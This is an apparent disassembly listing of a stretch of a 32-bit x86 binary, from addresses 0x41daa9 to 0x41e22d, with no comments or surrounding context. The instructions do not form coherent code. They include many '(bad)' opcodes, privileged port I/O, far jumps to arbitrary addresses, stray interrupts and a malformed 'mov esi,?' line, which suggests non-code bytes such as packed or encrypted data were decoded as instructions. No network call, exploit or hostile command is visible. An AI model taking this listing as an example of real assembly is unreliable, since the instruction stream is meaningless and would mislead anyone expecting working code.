  41daa9:	dec    edx
  41daaa:	fimul  WORD PTR [eax]
  41daac:	dec    BYTE PTR [esi-0x6c]
  41daaf:	iret   
  41dab0:	sbb    eax,0x5d755e02
  41dab5:	push   cs
  41dab6:	jmp    0x41db36
  41dab8:	dec    edi
  41dab9:	popf   
  41daba:	sub    al,0x2d
  41dabc:	adc    al,0x69
  41dabe:	jne    0x41db3d
  41dac0:	rcr    DWORD PTR [edi-0x63],0xe
  41dac4:	mov    esp,0x79624bf4
  41dac9:	inc    ebx
  41daca:	or     eax,0x80f8f162
  41dacf:	(bad)  
  41dad0:	push   0xa
  41dad2:	bound  esi,QWORD PTR [ebx-0x4fef9960]
  41dad8:	xor    BYTE PTR [ebp-0x3d],bh
  41dadb:	jge    0x41da6a
  41dadd:	aam    0x44
  41dadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dae0:	shl    BYTE PTR [esi],cl
  41dae2:	rcr    BYTE PTR [edx],cl
  41dae4:	add    esi,DWORD PTR [edi+0x32a99977]
  41daea:	add    edx,ecx
  41daec:	or     al,0x41
  41daee:	sbb    al,0x93
  41daf0:	mov    ds:0x725efea9,al
  41daf5:	cmp    al,0x9b
  41daf7:	repz xor DWORD PTR [edx-0x1f609849],ecx
  41dafe:	jmp    0xfab3795
  41db03:	push   esp
  41db04:	repnz and dh,BYTE PTR [edx]
  41db07:	push   0xffffffa9
  41db09:	mov    eax,0x4e2b44c3
  41db0e:	or     DWORD PTR [edi],0x36ba5e12
  41db14:	out    0x45,eax
  41db16:	or     edx,DWORD PTR [eax-0xf]
  41db19:	cs ffree st(7)
  41db1c:	into   
  41db1d:	dec    ecx
  41db1e:	inc    edi
  41db1f:	fs leave 
  41db21:	(bad)  
  41db22:	sbb    al,0x81
  41db24:	adc    DWORD PTR [ecx],0x5baa2f77
  41db2a:	add    BYTE PTR [esi],0xa9
  41db2d:	adc    DWORD PTR [ebx],esi
  41db2f:	sar    DWORD PTR [ecx+edx*4-0x743a532c],cl
  41db36:	or     al,0xae
  41db38:	adc    dh,BYTE PTR [edx]
  41db3a:	jp     0x8b52f7db
  41db40:	addr16 mov ch,0xac
  41db43:	mov    bl,0x13
  41db45:	fwait
  41db46:	add    eax,0xcd88bfe2
  41db4b:	and    esp,esp
  41db4d:	retf   
  41db4e:	jae    0x41db5f
  41db50:	nop    esp
  41db53:	enter  0x7ee,0xf
  41db57:	neg    BYTE PTR [edi+ecx*4]
  41db5a:	mov    DWORD PTR [edi],esp
  41db5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db5d:	add    bh,BYTE PTR [ebx-0x16]
  41db60:	stc    
  41db61:	xor    ah,bh
  41db63:	mov    esi,0x217120a5
  41db68:	jmp    0x7f530548
  41db6d:	int    0x2c
  41db6f:	mov    bh,ah
  41db71:	dec    edx
  41db72:	fwait
  41db73:	aam    0xd
  41db75:	dec    esp
  41db76:	mov    ah,ah
  41db78:	and    al,BYTE PTR [eax]
  41db7a:	mov    ebx,DWORD PTR [ecx-0x1f316dd6]
  41db80:	inc    BYTE PTR [edi+ebp*1-0x251b2302]
  41db87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db88:	mov    DWORD PTR [ebp+ecx*4-0xf7d818a],ebx
  41db8f:	push   ebx
  41db90:	popf   
  41db91:	sbb    DWORD PTR [eax-0x36],ebx
  41db94:	call   0x9c2f8832
  41db99:	iret   
  41db9a:	jne    0x41db72
  41db9c:	and    al,0xdd
  41db9e:	shl    DWORD PTR [edi-0x73],1
  41dba1:	cwde   
  41dba2:	jbe    0x41dbdc
  41dba4:	retf   
  41dba5:	lock out 0x76,al
  41dba8:	lods   al,BYTE PTR ds:[esi]
  41dba9:	cwde   
  41dbaa:	out    dx,al
  41dbab:	xchg   ecx,eax
  41dbac:	inc    ebx
  41dbad:	dec    edi
  41dbae:	stc    
  41dbaf:	fsub   DWORD PTR [ebx+0x7f]
  41dbb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb3:	lods   eax,DWORD PTR ds:[esi]
  41dbb4:	jle    0x41dc09
  41dbb6:	and    BYTE PTR [eax],bh
  41dbb8:	mov    bl,0x2a
  41dbba:	test   eax,0x329d419c
  41dbbf:	fbld   TBYTE PTR [ebx-0x36bdfecb]
  41dbc5:	loopne 0x41dbd9
  41dbc7:	xchg   DWORD PTR [ecx-0x31cfc83],esi
  41dbcd:	daa    
  41dbce:	cmp    BYTE PTR [esi-0x1dfe200c],bh
  41dbd4:	and    edi,DWORD PTR [esp+ebx*4+0x64]
  41dbd8:	xchg   DWORD PTR [ebx+0x4f],ecx
  41dbdb:	loope  0x41dc02
  41dbdd:	add    esi,DWORD PTR [ecx+0x6558fb65]
  41dbe3:	shr    DWORD PTR [edx+ebp*1-0xe],1
  41dbe7:	sbb    DWORD PTR [ecx+0x4e9f5f12],0x225d8645
  41dbf1:	jmp    0xb092:0x2a98ebce
  41dbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf9:	and    eax,0x1a875f75
  41dbfe:	push   ss
  41dbff:	imul   esp,DWORD PTR [ebp+0x45],0x13
  41dc03:	fcom   QWORD PTR [eax+0x5c]
  41dc06:	outs   dx,DWORD PTR ds:[esi]
  41dc07:	and    dl,cl
  41dc09:	mov    ah,0xdd
  41dc0b:	jmp    0x41dbac
  41dc0d:	pop    ecx
  41dc0e:	std    
  41dc0f:	sub    DWORD PTR [ebp+0x4d3265b8],ecx
  41dc15:	adc    eax,0xcc854453
  41dc1a:	dec    ebp
  41dc1b:	xchg   DWORD PTR [ebp+0x351dc565],ebx
  41dc21:	jnp    0x41dbb4
  41dc23:	pop    esi
  41dc24:	xor    dh,BYTE PTR [edx]
  41dc26:	dec    ecx
  41dc27:	pop    edx
  41dc28:	xlat   BYTE PTR ds:[ebx]
  41dc29:	cmp    cl,BYTE PTR [edx]
  41dc2b:	mov    ecx,0x7e60ea86
  41dc30:	inc    esp
  41dc31:	xchg   ebp,eax
  41dc32:	mov    esp,0xbe53918c
  41dc37:	adc    BYTE PTR [edx+0x6207e8e0],bl
  41dc3d:	aad    0xdd
  41dc3f:	fs sahf 
  41dc41:	inc    ecx
  41dc42:	loope  0x41dcc1
  41dc44:	es jae 0x41dbd6
  41dc47:	and    DWORD PTR [esi+0xd],ebp
  41dc4a:	mov    ah,0xc4
  41dc4c:	popf   
  41dc4d:	mov    ecx,0x3f207820
  41dc52:	rcr    BYTE PTR [eax-0x78b67634],cl
  41dc58:	adc    edi,DWORD PTR [eax-0x1aaffdd5]
  41dc5e:	shl    DWORD PTR [edi],cl
  41dc60:	and    al,0xf6
  41dc62:	mov    dh,0xfd
  41dc64:	clc    
  41dc65:	jo     0x41dc01
  41dc67:	mov    bh,0xec
  41dc69:	lods   eax,DWORD PTR ds:[esi]
  41dc6a:	mov    ds:0x96bb9b9b,al
  41dc6f:	cmp    ebx,eax
  41dc71:	jge    0x41dc58
  41dc73:	mov    eax,ds:0x20222c94
  41dc78:	sbb    ebx,DWORD PTR [esi+0x1cacdfd9]
  41dc7e:	pusha  
  41dc7f:	or     edi,DWORD PTR [esi-0x6e]
  41dc82:	imul   esp,DWORD PTR [ebx-0x5e51895a],0x48
  41dc89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8b:	pop    edi
  41dc8c:	jp     0x41dd02
  41dc8e:	dec    esi
  41dc8f:	stos   BYTE PTR es:[edi],al
  41dc90:	mov    esp,0xeacb9827
  41dc95:	mov    ah,0x59
  41dc97:	cld    
  41dc98:	add    ah,BYTE PTR [ebx-0x7f]
  41dc9b:	xor    DWORD PTR [ebp+0x6],ebx
  41dc9e:	jge    0x41dcbf
  41dca0:	pop    ebx
  41dca1:	push   ss
  41dca2:	cmp    eax,0x9b363326
  41dca7:	lea    edx,es:[edx+esi*2+0x4e]
  41dcac:	sub    dl,BYTE PTR [ecx-0x4bde275]
  41dcb2:	mov    bl,0xb7
  41dcb4:	ret    
  41dcb5:	(bad)  
  41dcb6:	jb     0x41dc81
  41dcb8:	push   cs
  41dcb9:	or     eax,0x4d47ebed
  41dcbe:	xor    DWORD PTR [eax],0xff55d014
  41dcc4:	pushf  
  41dcc5:	inc    ebp
  41dcc6:	inc    edx
  41dcc7:	sbb    edi,DWORD PTR [ebp+0x5b101173]
  41dccd:	ret    0x580b
  41dcd0:	fcomp  QWORD PTR [ebx]
  41dcd2:	xchg   bh,dl
  41dcd4:	add    cl,bl
  41dcd6:	js     0x41dcfe
  41dcd8:	dec    ebx
  41dcd9:	sub    esp,ecx
  41dcdb:	xlat   BYTE PTR ds:[ebx]
  41dcdc:	adc    al,0x1e
  41dcde:	(bad)  
  41dcdf:	cmp    BYTE PTR [edi+ecx*2],ch
  41dce2:	xchg   esp,eax
  41dce3:	mov    al,ds:0x4598f6f2
  41dce8:	inc    eax
  41dce9:	sub    BYTE PTR [ebx+0x74],ah
  41dcec:	out    0xa2,eax
  41dcee:	out    dx,al
  41dcef:	(bad)
  41dcf3:	das    
  41dcf4:	cmp    eax,esi
  41dcf6:	nop
  41dcf7:	xor    bh,BYTE PTR [edi+0x28d33681]
  41dcfd:	test   al,0x9c
  41dcff:	sar    BYTE PTR [edx],1
  41dd01:	adc    al,0xf9
  41dd03:	add    eax,DWORD PTR ss:[esi+eiz*2+0x73]
  41dd08:	popa   
  41dd09:	popf   
  41dd0a:	test   eax,0x5f92dcd3
  41dd0f:	push   esi
  41dd10:	cmp    eax,0x1b0de2a7
  41dd15:	sahf   
  41dd16:	or     BYTE PTR [eax],bh
  41dd18:	nop
  41dd19:	cdq    
  41dd1a:	mov    WORD PTR [esi+0x2f357f63],ss
  41dd20:	adc    eax,0xea25099b
  41dd25:	repz setno BYTE PTR [eax]
  41dd29:	add    BYTE PTR [ecx-0x113b611c],ah
  41dd2f:	sbb    al,0x15
  41dd31:	ret    
  41dd32:	lock jb 0x41dd97
  41dd35:	push   esi
  41dd36:	lock nop
  41dd38:	stos   DWORD PTR es:[edi],eax
  41dd39:	and    al,0x95
  41dd3b:	(bad)  
  41dd3c:	lods   al,BYTE PTR ds:[esi]
  41dd3d:	cmp    BYTE PTR [esi+esi*2],dh
  41dd40:	jge    0x41dcc8
  41dd42:	lods   eax,DWORD PTR ds:[esi]
  41dd43:	nop
  41dd44:	mov    eax,0x31857b74
  41dd49:	mov    ds:0xf0077006,al
  41dd4e:	pop    ss
  41dd4f:	mov    ah,0xad
  41dd51:	pushf  
  41dd52:	(bad)  
  41dd53:	ins    DWORD PTR es:[edi],dx
  41dd54:	dec    esi
  41dd55:	in     eax,dx
  41dd56:	inc    ebx
  41dd57:	(bad)  
  41dd58:	mov    cl,0x4
  41dd5a:	sbb    DWORD PTR [edi+ecx*8+0x6c],edx
  41dd5e:	xor    al,0x7c
  41dd60:	sbb    BYTE PTR [ebx+0x50],0x44
  41dd64:	sbb    al,0x92
  41dd66:	and    al,0xe5
  41dd69:	mov    dh,al
  41dd6b:	sub    al,BYTE PTR [eax-0x30d3ff72]
  41dd71:	out    dx,al
  41dd72:	mov    BYTE PTR [edi+edi*1],dh
  41dd75:	shl    bl,0x10
  41dd78:	cmp    al,0x45
  41dd7a:	cmp    al,0x3c
  41dd7c:	cmp    eax,0x28855b94
  41dd81:	retf   
  41dd82:	mov    dl,0x85
  41dd84:	fmul   DWORD PTR [edi-0x64917382]
  41dd8a:	cdq    
  41dd8b:	sub    dh,bh
  41dd8d:	mov    ds:0x8b69e658,al
  41dd92:	inc    ebp
  41dd93:	int    0x81
  41dd95:	neg    dl
  41dd97:	inc    edi
  41dd98:	cdq    
  41dd99:	cmp    ebp,ebx
  41dd9b:	mov    esi,0xb2ce7017
  41dda0:	pop    ds
  41dda1:	retf   
  41dda2:	mov    DWORD PTR [esp+ebp*4],esp
  41dda5:	ret    0x9214
  41dda8:	push   0x72883ad1
  41ddad:	retf   0x1002
  41ddb0:	test   al,0xcf
  41ddb2:	jns    0x41dd73
  41ddb4:	xor    DWORD PTR [ecx-0x26],edx
  41ddb7:	dec    ecx
  41ddb8:	ffreep st(7)
  41ddba:	data16 mov al,ds:0xea519d1f
  41ddc0:	inc    ebx
  41ddc1:	jp     0x41de01
  41ddc3:	dec    esi
  41ddc4:	xchg   DWORD PTR ds:0x926af3fe,edx
  41ddca:	mov    ecx,0xd4241abc
  41ddcf:	lods   al,BYTE PTR ds:[esi]
  41ddd0:	dec    esp
  41ddd1:	jmp    0x41dd53
  41ddd3:	mov    eax,0xee1e8a0f
  41ddd8:	(bad)  
  41ddd9:	test   BYTE PTR [edx],0x54
  41dddc:	cli    
  41dddd:	leave  
  41ddde:	popa   
  41dddf:	push   es
  41dde0:	mov    eax,DWORD PTR [edi-0x530fa4b4]
  41dde6:	in     al,0x59
  41dde8:	(bad)  
  41dde9:	js     0x41de3b
  41ddeb:	inc    ebp
  41ddec:	cmp    eax,0x87ac0570
  41ddf1:	sub    edx,DWORD PTR [eax]
  41ddf3:	ja     0x41de34
  41ddf5:	cmc    
  41ddf6:	fsub   st(4),st
  41ddf8:	clc    
  41ddf9:	retf   
  41ddfa:	xor    DWORD PTR ds:0x2943ca54,eax
  41de00:	retf   0x8a8f
  41de03:	pop    edx
  41de04:	sbb    dh,ah
  41de06:	jno    0x41ddcc
  41de08:	lea    eax,[esp+edi*1]
  41de0b:	fisttp QWORD PTR ds:0xaeee5668
  41de11:	add    eax,0x4630da95
  41de16:	inc    edx
  41de17:	out    dx,eax
  41de18:	xchg   ecx,eax
  41de19:	in     eax,dx
  41de1a:	jb     0x41dde1
  41de1c:	leave  
  41de1d:	sub    DWORD PTR [eax+0x6f],ecx
  41de20:	mov    ch,0x2a
  41de22:	adc    esi,DWORD PTR [edi+0x2a]
  41de25:	(bad)  
  41de26:	or     edi,DWORD PTR [esi-0x37]
  41de29:	xchg   ecx,eax
  41de2a:	inc    ebx
  41de2b:	sub    bh,BYTE PTR [eax-0x6a]
  41de2e:	retf   
  41de2f:	and    ebx,ecx
  41de31:	adc    al,0x1a
  41de33:	adc    dl,bl
  41de35:	loop   0x41ddef
  41de37:	int    0x5f
  41de39:	imul   ebx,eax,0xbe77f00c
  41de3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de40:	cmp    DWORD PTR [ebx+0x55d05952],edi
  41de46:	inc    edx
  41de47:	sub    BYTE PTR [esi],bh
  41de49:	xor    ecx,DWORD PTR [ebx+ebp*4-0x55a72fb1]
  41de50:	or     eax,0xfb0145cb
  41de55:	repz mov esi,0x9a864d6d
  41de5b:	rol    DWORD PTR [ebp-0x3529450b],1
  41de61:	ins    DWORD PTR es:[edi],dx
  41de62:	shr    BYTE PTR [esi+0x4c],0x17
  41de66:	std    
  41de67:	push   ebx
  41de68:	pop    eax
  41de69:	mov    ebp,0x779c4241
  41de6e:	mov    ch,0xdd
  41de70:	ss (bad) 
  41de72:	mov    ch,0x6b
  41de74:	ret    0xb095
  41de77:	rcr    BYTE PTR [esp+esi*1-0x56df2372],0x9f
  41de7f:	stc    
  41de80:	jl     0x41dec0
  41de82:	dec    eax
  41de83:	bnd jne 0x41deb2
  41de86:	mov    eax,gs
  41de88:	dec    ecx
  41de89:	ja     0x41dee1
  41de8b:	retf   
  41de8c:	pop    ebp
  41de8d:	cli    
  41de8e:	mov    eax,ds:0xbbbd95b9
  41de93:	shl    DWORD PTR [ebp-0x7f],1
  41de96:	mov    ebp,0x7f910f9d
  41de9b:	xchg   BYTE PTR [edx+ebp*1+0x1da6343c],bl
  41dea2:	int3   
  41dea3:	or     ebp,ebp
  41dea5:	retf   0xffc5
  41dea8:	mov    ebx,0x2240b606
  41dead:	sbb    eax,0x4e7b57fe
  41deb2:	dec    ebx
  41deb3:	data16 adc al,0x3f
  41deb6:	shl    DWORD PTR [edx-0x7113d163],cl
  41debc:	cld    
  41debd:	or     esp,DWORD PTR [eax+0x5a]
  41dec0:	in     al,0x13
  41dec2:	or     BYTE PTR [ebp-0xc],ch
  41dec5:	iret   
  41dec6:	into   
  41dec7:	loop   0x41de58
  41dec9:	or     ecx,DWORD PTR [ebp+0x16]
  41decc:	cwde   
  41decd:	sub    DWORD PTR [ebx],ebp
  41decf:	add    al,0x20
  41ded1:	pop    edx
  41ded2:	loopne 0x41df4c
  41ded4:	repnz shl BYTE PTR [ebx+0x4d5893f],1
  41dedb:	js     0x41de97
  41dedd:	and    BYTE PTR [edx+0x2],0x7e
  41dee1:	lds    esi,FWORD PTR [ebx-0x29]
  41dee4:	out    0x36,al
  41dee6:	repz push cs
  41dee8:	fistp  QWORD PTR [ebp-0x3f71f215]
  41deee:	xor    dl,BYTE PTR [ecx]
  41def0:	cld    
  41def1:	stos   DWORD PTR es:[edi],eax
  41def2:	es int3 
  41def4:	sbb    DWORD PTR [eax],eax
  41def6:	add    eax,0x548dd505
  41defb:	loop   0x41df44
  41defd:	jae    0x41ded7
  41deff:	jl     0x41df01
  41df01:	and    eax,0x9fffc9f2
  41df06:	dec    ecx
  41df07:	xlat   BYTE PTR ds:[ebx]
  41df08:	push   ss
  41df09:	lea    ecx,[eax]
  41df0b:	cli    
  41df0c:	cmp    al,0x40
  41df0e:	mov    al,ds:0x2f623b0
  41df13:	in     al,0x54
  41df15:	ror    DWORD PTR [edi+0x2eaa805a],cl
  41df1b:	jo     0x41df3f
  41df1d:	xor    BYTE PTR [eax-0x6d81f58b],dh
  41df23:	push   esi
  41df24:	cmc    
  41df25:	mov    ch,BYTE PTR [ecx+0x15]
  41df28:	arpl   WORD PTR [ebx],sp
  41df2a:	outs   dx,BYTE PTR ds:[esi]
  41df2b:	push   ebp
  41df2c:	cmp    BYTE PTR [eax-0x755dad96],cl
  41df32:	repz or esi,ecx
  41df35:	jns    0x41df97
  41df37:	dec    esi
  41df38:	adc    dh,BYTE PTR [edx]
  41df3a:	or     eax,0xadf57f83
  41df3f:	inc    esi
  41df40:	ret    0x5320
  41df43:	std    
  41df44:	into   
  41df45:	push   cs
  41df46:	(bad)  
  41df47:	fadd   QWORD PTR [ebx-0x4394c314]
  41df4d:	pop    edi
  41df4e:	push   ds
  41df4f:	add    dh,BYTE PTR [ecx-0x45]
  41df52:	out    0x27,al
  41df54:	push   ebx
  41df55:	xor    bh,dh
  41df57:	test   BYTE PTR [eax],0xf2
  41df5a:	push   esp
  41df5b:	mov    dl,0x19
  41df5d:	call   DWORD PTR [eax+0x59]
  41df60:	mov    esi,?
  41df62:	sysenter 
  41df64:	shl    edx,1
  41df66:	lea    ebx,[eax-0x52e72984]
  41df6c:	retf   0x1677
  41df6f:	scas   al,BYTE PTR es:[edi]
  41df70:	shr    DWORD PTR ds:0x157fc8c3,0xbb
  41df77:	mov    bl,BYTE PTR [esi]
  41df79:	outs   dx,BYTE PTR ds:[esi]
  41df7a:	xor    ch,ah
  41df7c:	dec    edx
  41df7d:	mov    ah,0x6
  41df7f:	mov    bl,dl
  41df81:	mov    ebp,0xb75fe485
  41df86:	xchg   esp,eax
  41df87:	mov    eax,ds:0xbb7f9f5e
  41df8c:	lahf   
  41df8d:	inc    ebp
  41df8e:	pop    ebp
  41df8f:	shl    dh,1
  41df91:	test   DWORD PTR [ebx],ebx
  41df93:	or     ah,dl
  41df95:	fisttp WORD PTR [eax+0x513e1369]
  41df9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df9c:	sbb    eax,0x9f8f9e61
  41dfa1:	push   ebx
  41dfa2:	mov    ds:0xaf0e5483,al
  41dfa7:	scas   eax,DWORD PTR es:[edi]
  41dfa8:	add    ecx,DWORD PTR [eax]
  41dfaa:	(bad)  
  41dfac:	cmc    
  41dfad:	test   DWORD PTR [esi+0x5],eax
  41dfb0:	xchg   ecx,eax
  41dfb1:	(bad)  
  41dfb2:	(bad)  
  41dfb3:	fisttp WORD PTR [edi+0x4bedd889]
  41dfb9:	inc    ebx
  41dfba:	enter  0xd6e7,0x25
  41dfbe:	out    0x4c,eax
  41dfc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfc1:	jp     0x41dff5
  41dfc3:	xchg   edi,eax
  41dfc4:	ja     0x41e038
  41dfc6:	mov    dl,0xce
  41dfc8:	xchg   BYTE PTR [edi],al
  41dfca:	icebp  
  41dfcb:	xor    al,0x1
  41dfcd:	clc    
  41dfce:	sbb    bh,BYTE PTR [ecx]
  41dfd0:	xchg   esi,eax
  41dfd1:	arpl   WORD PTR [esi],si
  41dfd3:	mov    ah,0x33
  41dfd5:	pop    ebp
  41dfd6:	sub    DWORD PTR [eax-0x10],0x54
  41dfda:	pop    ss
  41dfdb:	mov    al,ds:0x87c20402
  41dfe0:	mov    ds:0xae0371f3,al
  41dfe5:	sub    DWORD PTR [ecx-0x3d],esp
  41dfe8:	dec    esi
  41dfe9:	cmp    edi,0xfffffff9
  41dfec:	mov    al,ds:0x350a2347
  41dff1:	fnsave [edx]
  41dff3:	jmp    0xb0b9:0xc7ba3bec
  41dffa:	pop    ecx
  41dffb:	pop    ds
  41dffc:	pop    bx
  41dffe:	adc    BYTE PTR [ecx],0xf9
  41e001:	imul   edi,esp,0xffffffa9
  41e004:	jbe    0x41dfec
  41e006:	adc    esp,DWORD PTR [ebx]
  41e008:	jno    0x41e025
  41e00a:	sbb    al,0xec
  41e00c:	js     0x41e019
  41e00e:	test   al,0xc3
  41e010:	(bad)  
  41e011:	or     eax,DWORD PTR [esp+edx*4+0x534055e4]
  41e018:	ins    BYTE PTR es:[edi],dx
  41e019:	loope  0x41e085
  41e01b:	fs std 
  41e01d:	stos   BYTE PTR es:[edi],al
  41e01e:	repnz pop ebx
  41e020:	(bad)  
  41e022:	in     eax,dx
  41e023:	mov    eax,0xf818a43a
  41e028:	push   0xef76c63e
  41e02d:	test   al,0xe1
  41e02f:	outs   dx,BYTE PTR ds:[esi]
  41e030:	jne    0x41e07e
  41e032:	sub    BYTE PTR [ecx-0x53],bl
  41e035:	out    dx,al
  41e036:	fcomp  DWORD PTR [edx+0x4e]
  41e039:	sbb    al,0x12
  41e03b:	outs   dx,BYTE PTR ds:[esi]
  41e03c:	mov    eax,0xd3b958dc
  41e041:	sar    DWORD PTR [edi],1
  41e043:	stos   BYTE PTR es:[edi],al
  41e044:	cmp    al,0x9c
  41e046:	inc    esi
  41e047:	pop    edi
  41e048:	mov    ch,0x8d
  41e04a:	jp     0x41e050
  41e04c:	or     esi,esi
  41e04e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e04f:	sbb    BYTE PTR [eax],0xf8
  41e052:	loope  0x41e031
  41e054:	jmp    0x202c:0x5993d9ce
  41e05b:	cwde   
  41e05c:	adc    eax,DWORD PTR [esi+0x1a277457]
  41e062:	push   ss
  41e063:	add    ch,BYTE PTR [ecx+0x43707820]
  41e069:	mov    esi,0x19a6c952
  41e06e:	inc    esi
  41e06f:	dec    eax
  41e070:	cld    
  41e071:	or     ebx,edx
  41e073:	cmp    al,0x3f
  41e075:	push   0x44
  41e077:	test   al,0xe8
  41e079:	mov    eax,DWORD PTR [ecx]
  41e07b:	cmp    edx,DWORD PTR [edx-0x21f48bb2]
  41e081:	sub    DWORD PTR [eax+0x3db98622],edi
  41e087:	sub    edx,eax
  41e089:	and    BYTE PTR [ebx],dh
  41e08b:	iret   
  41e08c:	xchg   edi,eax
  41e08d:	ret    
  41e08e:	icebp  
  41e08f:	mov    ds:0x5a241964,al
  41e094:	aaa    
  41e095:	scas   eax,DWORD PTR es:[edi]
  41e096:	mov    al,0x7
  41e098:	push   esi
  41e099:	data16 aad 0x71
  41e09c:	out    dx,eax
  41e09d:	xlat   BYTE PTR ds:[ebx]
  41e09e:	cmc    
  41e09f:	mov    bl,0x7b
  41e0a1:	xchg   edi,eax
  41e0a2:	sbb    ah,BYTE PTR ds:0x275a82f6
  41e0a8:	lds    esi,FWORD PTR [ebp-0x63b74af0]
  41e0ae:	mov    ecx,0x2e854855
  41e0b3:	xlat   BYTE PTR ds:[ebx]
  41e0b4:	icebp  
  41e0b5:	fdivr  DWORD PTR [ecx-0x7e]
  41e0b8:	fcomp  QWORD PTR [ebp+0x2d]
  41e0bb:	mov    ebx,0xe1e2d69b
  41e0c0:	je     0x41e0bf
  41e0c2:	dec    ecx
  41e0c3:	int    0x7c
  41e0c5:	lds    ecx,FWORD PTR [edi]
  41e0c7:	leave  
  41e0c8:	jns    0x41e064
  41e0ca:	and    DWORD PTR [ebx+ebp*1-0x69],0x35024210
  41e0d2:	pop    es
  41e0d3:	stos   DWORD PTR es:[edi],eax
  41e0d4:	das    
  41e0d5:	ret    
  41e0d6:	or     al,0xb8
  41e0d8:	and    DWORD PTR [ecx+0xbcee07b],ecx
  41e0de:	mov    ebp,0xa91004ee
  41e0e3:	clc    
  41e0e4:	cmp    eax,0xee022230
  41e0e9:	mov    esp,0xaab58238
  41e0ee:	pop    esi
  41e0ef:	push   edi
  41e0f0:	int    0x5e
  41e0f2:	es mov ebx,0xf3c80ff0
  41e0f8:	arpl   WORD PTR [ebx+edi*1+0x45a28646],bp
  41e0ff:	cmc    
  41e100:	xor    al,0x73
  41e102:	mov    BYTE PTR [ebx],ch
  41e104:	push   0x720c735e
  41e109:	xlat   BYTE PTR ds:[ebx]
  41e10a:	pop    ebx
  41e10b:	test   al,0x5d
  41e10d:	ret    0x1cab
  41e110:	les    edx,FWORD PTR [ecx+edx*2+0x58]
  41e114:	outs   dx,DWORD PTR ds:[esi]
  41e115:	ins    DWORD PTR es:[edi],dx
  41e116:	not    BYTE PTR [edx+0x35]
  41e119:	push   0x43
  41e11b:	pop    es
  41e11c:	push   esp
  41e11d:	or     dl,ch
  41e11f:	push   ss
  41e120:	out    0xe7,eax
  41e122:	int    0xe3
  41e124:	pop    ebp
  41e125:	jecxz  0x41e0c2
  41e127:	(bad)  
  41e128:	push   esi
  41e129:	fisttp DWORD PTR [ebp-0x8be6266]
  41e12f:	push   ds
  41e130:	inc    esp
  41e131:	ret    
  41e132:	rol    DWORD PTR [ecx],0x62
  41e135:	ins    BYTE PTR es:[edi],dx
  41e136:	and    al,0xaa
  41e138:	or     al,0x8e
  41e13a:	xor    al,0x89
  41e13c:	dec    edi
  41e13d:	inc    ebx
  41e13e:	pop    ecx
  41e13f:	sahf   
  41e140:	mov    ecx,0x263e7210
  41e145:	mov    cl,0x1d
  41e147:	fadd   QWORD PTR [ecx+edx*8]
  41e14a:	inc    esi
  41e14b:	adc    eax,0x6fdf8287
  41e150:	pop    ebp
  41e151:	fisttp QWORD PTR [ebx+0x8506e20]
  41e157:	in     eax,dx
  41e158:	jo     0x41e18b
  41e15a:	add    BYTE PTR [ebx-0x70151242],cl
  41e160:	mov    eax,ds:0x606a9e4c
  41e165:	in     eax,0x7b
  41e167:	pop    esi
  41e168:	outs   dx,DWORD PTR ds:[esi]
  41e169:	jbe    0x41e184
  41e16b:	sbb    eax,0x784c9cd7
  41e170:	sti    
  41e171:	(bad)  
  41e172:	sub    al,BYTE PTR [ebp-0x52]
  41e175:	dec    ebp
  41e176:	rol    DWORD PTR [eax+0x45],cl
  41e179:	pop    ss
  41e17a:	or     esi,ebp
  41e17c:	mov    ds:0xd41f71ad,al
  41e181:	std    
  41e182:	arpl   di,bx
  41e184:	pop    edx
  41e185:	jae    0x41e142
  41e187:	pop    ds
  41e188:	retf   0x959f
  41e18b:	popf   
  41e18c:	sub    bh,bh
  41e18e:	test   al,0x65
  41e190:	fidivr WORD PTR [edi-0x718b35ef]
  41e196:	or     DWORD PTR [ecx],edx
  41e198:	icebp  
  41e199:	and    esp,DWORD PTR [ecx-0x7b]
  41e19c:	loope  0x41e171
  41e19e:	out    dx,al
  41e19f:	out    0x21,al
  41e1a1:	sbb    eax,0xa666d61a
  41e1a6:	sar    DWORD PTR [edi+ebx*4+0x8dfc2fe],cl
  41e1ad:	push   0xaf438216
  41e1b2:	ret    
  41e1b3:	xchg   edi,eax
  41e1b4:	cmp    DWORD PTR [esi+0x81744c8],esi
  41e1ba:	dec    ebp
  41e1bb:	lods   al,BYTE PTR ds:[esi]
  41e1bc:	jg     0x41e196
  41e1be:	pop    ecx
  41e1bf:	jbe    0x41e1cf
  41e1c1:	sbb    edx,0x4cbe80a
  41e1c7:	loopne 0x41e197
  41e1c9:	mov    ch,0xc6
  41e1cb:	inc    edx
  41e1cc:	push   ebp
  41e1cd:	nop
  41e1ce:	test   DWORD PTR [edi-0x6d],esi
  41e1d1:	push   0x2ed4d49b
  41e1d6:	das    
  41e1d7:	inc    ecx
  41e1d8:	das    
  41e1d9:	js     0x41e211
  41e1db:	mov    edx,0x4d0c638f
  41e1e0:	xchg   esp,eax
  41e1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1e2:	xchg   esp,eax
  41e1e3:	enter  0xfa46,0xec
  41e1e7:	shr    DWORD PTR [esi+0x6cb55281],0x51
  41e1ee:	xchg   esp,eax
  41e1ef:	call   0x9a1d8366
  41e1f4:	dec    esi
  41e1f5:	mov    esp,0x3b4d3f29
  41e1fa:	jne    0x41e253
  41e1fc:	adc    al,0xd6
  41e1fe:	iret   
  41e1ff:	add    DWORD PTR [ebp+0x5f],esp
  41e202:	sbb    BYTE PTR [ecx],0x5a
  41e205:	imul   eax,DWORD PTR [esi+ebp*2],0xffffffcc
  41e209:	fnstsw ax
  41e20b:	ds or  eax,0xbe087d30
  41e211:	out    dx,al
  41e212:	stc    
  41e213:	ret    0x2484
  41e216:	sahf   
  41e217:	fisubr WORD PTR [esi+0x55]
  41e21a:	xor    DWORD PTR [eax-0x1dccd0b],edi
  41e220:	mov    ebx,0x8ebd29a3
  41e225:	(bad)  
  41e226:	scas   al,BYTE PTR es:[edi]
  41e227:	fst    DWORD PTR [ebp+0x35f591ca]
  41e22d:	mov    al,0x64
